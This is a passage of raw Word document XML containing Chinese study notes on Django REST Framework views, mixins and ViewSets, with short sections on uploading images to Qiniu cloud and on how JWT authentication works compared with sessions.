        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>写视图的步骤:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3DF251" w14:textId="46F09141" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="001D56F9" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>数据库查询, 2. 构建序列化器, 进行序列化操作, 返回数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C5B1D8" w14:textId="5355A60A" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="001D56F9" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一. 两大基类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50190769" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1 APIView (以常规的方法实现get post put delet 等)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C95DA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>继承与VIew, 可以帮助我们处理request和response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217F4337" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>可以捕获异常处理, 处理成适合的响应信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B446A09" w14:textId="70199BEA" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>进行第三patch()分发前, 对用户进行身份验证, 权限验证, 流量控制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB6E196" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>支持的定义属性:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A200FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>authentication_classes 列表或元祖，身份认证类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631ED1BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>permissoin_classes 列表或元祖，权限检查类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA4A872" w14:textId="130C8A35" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>throttle_classes 列表或元祖，流量控制类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AA72A1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2 GenericsAPIView 继承于 APIView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A5759B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>支持定义的属性：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5DB749" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>列表视图与详情视图通用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B4E633" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>queryset 列表视图的查询集 查询单一, 所有</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700B41CE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>serializer_class 视图使用的序列化器 指明序列化器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42674EC4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>列表视图使用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A20C4B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pagination_class 分页控制类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD92A19" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>filter_backends 过滤控制后端</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6B8283" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>详情页视图使用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335DAE61" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>lookup_field 查询单一数据库对象时使用的条件字段，默认为’pk’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DF062A" w14:textId="5A7AC829" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>lookup_url_kwarg 查询单一数据时URL中的参数关键字名称，默认与look_field相同</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C77355" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>提供的方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BFC508C" w14:textId="2BF77EC7" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>列表视图与详情视图通用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AAFC27" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>get_queryset(self)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F983038" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>返回视图使用的查询集，是列表视图与详情视图获取数据的基础，默认返回queryset属性，可以重写</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7EBC32" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="00A97A49" w:rsidRDefault="00A63022" w:rsidP="00A97A49">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A97A49">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>二. 五个扩展类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3774E1D2" w14:textId="77777777" w:rsidR="00D8288D"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ListModelMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4161A05C" w14:textId="77777777" w:rsidR="00D8288D"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查询所有数据的扩展类, 该视图提供 list(request, *args, **kwargs) 实现列表视图, 返回200</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35069A90" w14:textId="1A080983" w:rsidR="00A63022"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list方法对数据进行过滤和分页. -------&gt; 查询出过滤分页后所有的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FED00A" w14:textId="77777777" w:rsidR="00D8288D"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CreateModelMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55669892" w14:textId="77777777" w:rsidR="00D8288D"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创建视图的扩展类, 该视图提供 create(request, *args, **kwargs)来创建资源的视图, 返回201</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59645C54" w14:textId="3A7FD6F7" w:rsidR="00A63022"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序列化验证失败, 返回400错误</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552CF0E1" w14:textId="77777777" w:rsidR="00D8288D"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RetrieveModelMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CF6823" w14:textId="77777777" w:rsidR="00D8288D"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详情视图扩展类, 该视图提供 retrieve(request, *args, **kwargs), 快速的返回一个详情页</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A36F06F" w14:textId="3821CD58" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00995934">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="144"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:ind w:left="60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存在查询对象返回200, 不存在就是404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DAD353"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4UpdateModelMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C13E355"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更新视图扩展类, 提供update(request, *args, *kwargs), 更新一个存在的对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6611A758"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同时也提供partial_update(request, *args, **kwargs)方法，可以实现局部更新。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FE70C9"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成功返回200，序列化器校验数据失败时，返回400错误。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED0EB75"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5.DestroyModelMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEEBF57"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删除视图扩展类, 提供destroy(request, *args, **kwargs)方法, 删除一个存在的数据对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B2BE13" w14:textId="3FE5D37A"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成功返回 204 , 不存在返回 404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E629377" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="40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三. 视图集 ViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C329A2B" w14:textId="582F6C82" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>使用视图集ViewSet，可以将一系列逻辑相关的动作放到一个类中：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCE3CB9"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list() 提供一组数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE58063"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retrieve() 提供单个数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BE07DA"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create() 创建数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF411A5"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lastRenderedPageBreak/>
        <w:t>update() 保存数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C515775" w14:textId="363FF057"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destory() 删除数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22470E02" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>ViewSet视图集类不再实现get()、post()等方法，而是实现动作 action 如 list() 、create() 等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07951CD1" w14:textId="2755D131" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>视图集只在使用as_view()方法的时候，才会将action动作与具体请求方式对应上</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7F3465" w14:textId="09621737" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A54E19"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008</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七牛云</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710A08EA" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>就是服务器收到浏览器的上传图片请求，然后接受请求，读取图片，校验图片，调用七牛云sdk,最后再把图片名称存入数据库里。它是安装这个第三方包，然后根据SDK文档里有一些示例代码，把这些实例代码进行封装成方法,然后用request.files.get(’’).read()得到上传的图片，再用import导入包，调用storage方法，里面有put_file方法将图片文件上传到七牛云里。并设置用户模型数据，将文件信息保存到数据库里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DB74FB" w14:textId="47711255" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A54E19"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009</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jwt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2904ED86" w14:textId="3E016A9B" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在项目中，jwt token认证机制是对session认证机制的替代，基于之前的session认证机制，存在以下问题：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3096DBEA"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ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1）session信息存储在服务器端，如果登录用户过多，会占用过多服务器的空间；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BD8AAD"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2）session依赖于cookie，session信息的标识保存在cookie中，如果cookie被截获，可能会造成 CSRF(跨站请求伪造攻击)；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D18F28A" w14:textId="267F67CA"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3）session认证不适合的分布式站点的应用场景。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDFA3F9"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1）对于jwt token的认证机制，在用户登录时，服务器会签发(</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>生成</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)一个jwt token字符串；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CD4797"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2）服务器在响应时将jwt token数据返回给客户端，客户端需保存jwt token数据；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011D6F34" w14:textId="1AA2636F"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3）之后客户端在请求服务器时，如果需要进行用户的认证，需要将jwt token数据通过请求头传递给服务器，服务器会核验jwt token数据的有效性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613FD3EA" w14:textId="77777777"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jwt token字符串组成`：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588E7377"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包含3部分内容，用</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>隔开。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066F39DD"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1）头部(header)：包含token类型和加密算法信息，使用base64编码生成字符串。</w:t>
      </w:r>
    </w:p>
